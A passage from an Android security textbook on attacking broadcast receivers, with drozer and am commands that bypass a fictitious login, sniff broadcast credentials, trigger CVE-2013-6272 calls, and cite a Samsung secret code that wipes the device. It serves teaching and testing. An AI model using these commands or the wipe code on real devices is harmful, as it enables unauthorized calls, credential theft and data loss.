...while processing ClassLoadTest.class
1 warning
no classfiles specified
Error whilst building APK bundle.
The default version of javac that the system uses can be changed by performing the following command
and then selecting the correct version contained in JDK 1.6:
$ sudo update-alternatives --config javac
In our experience, the use of AIDL implementations in applications is extremely rare. Thus, we do not explore
the issue further. You can find more information about interacting with AIDL services in the Google
documentation at http://developer.android.com/guide/components/aidl.html.
Abusing Broadcast Receivers
Broadcast receivers have a variety of peculiarities and have functionality that one would not expect. Every day
broadcast receivers could be used to provide a notification of some event or potentially pass some piece of
information to multiple applications at the same time. This section explores all the attack avenues that end in
reaching a broadcast receiver in some way.
Unprotected Broadcast Receivers
In the same way as all the other application components, broadcast receivers can specify a permission that the
caller must hold in order to interact with it. If an application makes use of a custom broadcast receiver and does
not specify a permission that the caller needs to hold, the application is exposing this component to abuse by
other applications on the device. To find the broadcast receivers in an application, examine the manifest or the
app.broadcast.info module in drozer:
dz> run app.broadcast.info -a com.android.browser
Package: com.android.browser
com.android.browser.widget.BookmarkThumbnailWidgetProvider
Permission: null
com.android.browser.OpenDownloadReceiver
Permission: null
com.android.browser.AccountsChangedReceiver
Permission: null
com.android.browser.PreloadRequestReceiver
Permission: com.android.browser.permission.PRELOAD
Applications can make use of the sendBroadcast()method and send broadcasts whose impact is determined
completely by what code is run in the onReceive()method of the broadcast receivers that receive the sent intent.
This applies in exactly the same way for broadcast receivers that have been registered at runtime using the
registerReceiver()method. To discover broadcast receivers that have been registered at runtime you must
search through the code of the application; drozer will not find them using the app .broadcast.info module.
A subtle difference exists in the way that the sending of broadcasts works in comparison to other application
components. Broadcasts were intended to reach one or more recipients, unlike the sending of intents to other
components which only ends up at a single recipient. This lead to the design decision that any application can
broadcast an intent (as long as it’s not a predefined protected intent) and it is up to the broadcast receiver to
specify what permission the source application must hold in order for the broadcast receiver to acknowledge
this intent as valid. This also works the same in the other direction. When broadcasting an intent, you can
specify that only applications that hold a certain permission can receive the intent.
System Broadcasts
Although an application can broadcast most intents, a handful of intents are protected and can only be
sent by system applications. A good example of an action that cannot be specified in an intent sent by a
non-system application is android .intent.action.REBOOT. This makes sense because it would not be a
secure design if any application could tell the device to reboot. To find a list of all the actions that you can
set inside an intent and whether they are protected or not go to
http://developer.android.com/reference/android/content/Intent.html.
Interestingly, an application’s broadcast receiver has no way of determining which application sent an intent to
it. The information could be inferred in various ways; for instance, if making use of a permission with a
protection level of signature it can be presumed that only another trusted application could have sent it.
However, even this security feature is flawed under certain circumstances because of the Protection Level
Downgrade Attack explained earlier in this chapter.
The following fictitious example demonstrates an application with a vulnerable broadcast receiver. You have to
use some imagination here because Sieve does not contain any broadcast receivers. The application does the
following:
1. It has a login activity that accepts user credentials.
2. This activity checks the entered credentials with a server on the Internet.
3. If the credentials are correct, it sends a broadcast containing the action com.myapp.CORRECT_CREDS.
4. A broadcast receiver with the following intent filter catches this intent:
5. If an intent arrives at the broadcast receiver with the correct action (com .myapp.CORRECT_CREDS), it starts an
activity with authenticated content for the user.
What is wrong with the preceding scenario? The problem is that the whole login activity process can be
bypassed by an attacker that broadcasts an intent with an action of com.myapp.CORRECT_CREDS. This can be done
in the following way in drozer:
dz> run app.broadcast.send --action com.myapp.CORRECT_CREDS
Now consider the scenario where the manifest declaration was updated by the developer and the broadcast
receiver is no longer exported, which may look as follows:
As with other application components, a privileged user can broadcast an intent to a component even if this
application component is not exported in its manifest declaration. This means that an attacker making use of a
privileged shell would be able to broadcast an intent and gain access to this application as an authenticated user.
This could be done using:
root@android:/ # am broadcast -a com.myapp.CORRECT_CREDS -n com.myapp/
.LoginReceiver
REAL-WORLD EXAMPLE: CVE-2013-6272 INITIATE OR TERMINATE CALLS WITHOUT
APPROPRIATE PERMISSIONS ON ANDROID 4.4.2 AND EARLIER
Curesec discovered multiple vulnerabilities in the Android codebase and made them publicly available on
July 4, 2014 on its blog (see http://blog.curesec.com/article/blog/35.html).
This vulnerability allows any application to initiate and terminate phone calls without the appropriate
permissions. The affected code was a broadcast receiver that is part of the stock com.android.phone
package. The offending broadcast receiver was named PhoneGlobals$NotificationBroadcastReceiver;
here is the output of the actions it catches and the required permission to interact with it:
dz> run app.broadcast.info -a com.android.phone -i -f com.android.phone.
PhoneGlobals$NotificationBroadcastReceiver
Package: com.android.phone
com.android.phone.PhoneGlobals$NotificationBroadcastReceiver
Intent Filter:
Actions:
- com.android.phone.ACTION_HANG_UP_ONGOING_CALL
- com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION
- com.android.phone.ACTION_SEND_SMS_FROM_NOTIFICATION
Permission: null
Here is the onReceive() method of this receiver that catches these intents:
public static class NotificationBroadcastReceiver
extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
String action = intent.getAction();
// TODO: use "if (VDBG)" here.
Log.d(LOG_TAG, "Broadcast from Notification: " + action);
if (action.equals(ACTION_HANG_UP_ONGOING_CALL)) {
PhoneUtils.hangup(PhoneGlobals.getInstance().mCM);
} else if (action.equals(ACTION_CALL_BACK_FROM_NOTIFICATION)) {
// Collapse the expanded notification and the notification
item itself.
closeSystemDialogs(context);
clearMissedCallNotification(context);
Intent callIntent = new Intent(
Intent.ACTION_CALL_PRIVILEGED, intent.getData());
callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
| Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
context.startActivity(callIntent);
....
}
}
This shows a clear path for an unauthorized application to terminate a call or initiate a call to a provided
number. Initiating a call from drozer by exploiting this vulnerability is shown here:
dz> run app.broadcast.send --component com.android.phone
com.android.phone.PhoneGlobals$NotificationBroadcastReceiver
--action com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION
--data-uri tel:123456789
Figure 7.10 shows the screen that results from the running of this action.
Figure 7.10 Call initiated from exploiting a broadcast receiver in com.android.phone
Intent Sniffing
Intent sniffing is when a broadcast receiver can register to receive broadcasts that may have been intended for
other applications. This is possible because some applications broadcast intents and do not define a required
permission that a broadcast receiver must hold in order to receive the intent or do not provide a destination
package for the intent.
You can review the source code of an application in search of intents being sent using the sendBroadcast()
method and then register a receiver that catches this information from a non-privileged application. You can
catch these intents in drozer using the app.broadcast.sniff module. In some cases, the information being
broadcasted may not be sensitive. An example of this is an intent frequently broadcasted on Android systems
with an action of android.intent .action.BATTERY_CHANGED. This intent simply gives information about the
state of the battery. Catching this intent in drozer looks like this:
dz> run app.broadcast.sniff --action android.intent.action
.BATTERY_CHANGED
[*] Broadcast receiver registered to sniff matching intents
[*] Output is updated once a second. Press Control+C to exit.
Action: android.intent.action.BATTERY_CHANGED
Raw: Intent { act=android.intent.action.BATTERY_CHANGED flg=0x60000010
(has extras) }
Extra: icon-small=17303125 (java.lang.Integer)
Extra: scale=100 (java.lang.Integer)
Extra: present=true (java.lang.Boolean)
Extra: technology=Li-ion (java.lang.String)
Extra: level=53 (java.lang.Integer)
Extra: voltage=4084 (java.lang.Integer)
Extra: status=2 (java.lang.Integer)
Extra: invalid_charger=0 (java.lang.Integer)
Extra: plugged=2 (java.lang.Integer)
Extra: health=2 (java.lang.Integer)
Extra: temperature=301 (java.lang.Integer)
Now tweak our fictitious example once more and say that the developer used a broadcast with an action of
com.myapp.USER_LOGIN to relay the user’s typed-in credentials from the login screen to a broadcast receiver that
launched authenticated activities. To emulate the sending of this broadcast, we are going to use am. The
following am command represents the sending of this broadcast from the login activity in our fictitious
application and contains the username and pin code for the application:
$ adb shell am broadcast -a com.myapp.USER_LOGIN --ez ALLOW_LOGIN true
--es USERNAME tyrone --es PIN 2342
Broadcasting: Intent { act=com.myapp.USER_LOGIN (has extras) }
Broadcast completed: result=0
Unbeknownst to the application developer, this broadcast can actually be received by any application that has
registered a broadcast receiver with an intent filter for the com.myapp.USER_LOGIN action. Let’s emulate an
unprivileged application and catch this intent using drozer:
dz> run app.broadcast.sniff --action com.myapp.USER_LOGIN
[*] Broadcast receiver registered to sniff matching intents
[*] Output is updated once a second. Press Control+C to exit.
Action: com.myapp.USER_LOGIN
Raw: Intent { act=com.myapp.USER_LOGIN flg=0x10 (has extras) }
Extra: PIN=2342 (java.lang.String)
Extra: ALLOW_LOGIN=true (java.lang.Boolean)
Extra: USERNAME=tyrone (java.lang.String)
The drozer module received this intent. The first tool that demonstrated the sniffing of intents from broadcasts
was created by Jesse Burns of iSEC Partners. You can find it at https://www.isecpartners.com/tools/mobile-
security/intent-sniffer.aspx. It employs some nifty techniques to gain coverage of as many intents as
possible and works well when you need to test for intent sniffing vulnerabilities on all applications on a device
at once.
Secret Codes
Secret codes are sequences of numbers that can be typed into the Android dialer and caught by an application’s
broadcast receiver with the appropriate intent filter. Intent filters that can be used to catch these events must
have an action of android.provider.Telephony.SECRET_CODE, a data scheme of android_secret_code, and the
data host attribute as the number that is dialed.
On a stock Android 4.4 emulator, you can find the following defined secret codes:
dz> run scanner.misc.secretcodes
Package: com.android.providers.calendar
225
Package: com.android.netspeed
77333
Package: com.android.settings
4636
Package: com.android.protips
8477
Package: com.android.email
36245
Taking a closer look at broadcast receivers in the com.android.settings package reveals the following:
dz> run app.broadcast.info -a com.android.settings -i
Package: com.android.settings
...
com.android.settings.TestingSettingsBroadcastReceiver
Intent Filter:
Actions:
- android.provider.Telephony.SECRET_CODE
Data:
- android_secret_code://4636:** (type: *)
Permission: null
...
Notice that the receiver named TestingSettingsBroadcastReceiver in the preceding output has an intent filter
with an action android.provider.Telephony .SECRET_CODE and the data attribute that starts with a scheme of
android_secret_code. This means that the broadcast generated by typing *#*#4636#*#* in the dialer reaches the
following code in the TestingSettingsBroadcastReceiver class:
public class TestingSettingsBroadcastReceiver extends BroadcastReceiver
{
public void onReceive(Context paramContext, Intent paramIntent)
{
if (paramIntent.getAction().equals(
"android.provider.Telephony.SECRET_CODE"))
{
Intent localIntent = new Intent("android.intent.action.MAIN");
localIntent.setClass(paramContext, TestingSettings.class);
localIntent.setFlags(268435456);
paramContext.startActivity(localIntent);
}
}
}
At this point, the broadcast receiver could have chosen to run any code. In this particular instance, all that it is
doing is starting an activity. Figure 7.11 shows the activity that was started from this secret code.
Figure 7.11 Activity started by entering *#*#4636#*#* in the dialer
On many physical Android devices you will find many secret codes defined that expose all kinds of debugging
functionality or code that is used in the factory for device testing. To compare the output generated by drozer to
the actual manifest declaration, the latter is shown here:
Implementing a secret code in your application that performs an action directly when the secret code is invoked
is dangerous because invoking these codes from other applications is possible. One of the best attack vectors
discovered is being able to invoke secret codes from the web browser. The discovery was that it was possible on
some devices to invoke secret codes using the tel handler in a web page. An example of this attack is shown in
the following real-world example.
REAL-WORLD EXAMPLE: REMOTE WIPE OF SAMSUNG GALAXY DEVICES
At the Ekoparty conference (see http://www.ekoparty.org/) in 2012, Ravi Borgaonkar demonstrated the
remote wiping of a Samsung Galaxy device by visiting a malicious web page. This attack made use of a
secret code that was being invoked from the web page.
It was discovered that the following secret code performed a full factory reset on the device without
prompting the user:
*2767*3855#
It was also discovered that this could be included in a web page and be invoked from the browser using the
tel: handler. This handler is normally used to include phone numbers on websites that are clickable and
then appear in the dialer activity; for example, Dial now. Including a frame
in the page with the source attribute set to the following exploits this bug:
You can do a proof of concept of invoking the *#*#4636#*#* code previously shown from the web browser
by visiting a page with the following HTML: